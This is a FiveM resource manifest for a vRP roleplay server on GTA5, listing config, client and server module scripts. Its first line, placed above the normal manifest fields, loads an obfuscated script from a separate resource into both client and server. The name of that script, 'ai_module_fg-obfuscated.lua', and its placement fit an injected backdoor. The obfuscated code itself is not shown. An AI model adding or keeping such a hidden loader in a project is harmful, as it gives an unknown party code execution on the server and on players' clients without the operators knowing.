shared_script '@Lcmenu/ai_module_fg-obfuscated.lua'
fx_version "bodacious"
game "gta5"
lua54 "yes"
version "1.6.1"
author "ImagicTheCat"
HypexNetwork "yes"
creator "no"

client_scripts {
	"config/*",
	"lib/Utils.lua",
	"client/*"
}

server_scripts {
	"config/*",
	"lib/Utils.lua",
	"modules/vrp.lua",
	"modules/server.lua",
	"modules/street.lua",
	"modules/funtionslib.lua",
	"modules/misc.lua",
	"modules/prepare.lua",
	"modules/base.lua",
	"modules/drugs.lua",
	"modules/groups.lua",
	"modules/identity.lua",
	"modules/inventory.lua",
	"modules/money.lua",
	"modules/party.lua",
	"modules/rolepass.lua",
	"modules/player.lua",
	"modules/premium.lua",
	"modules/queue.lua",
	"modules/vehicles.lua",
	"modules/salary.lua",
    "modules/Webhooks.lua"
}

files {
	"lib/*",
	"config/*",
	"config/**/*"
}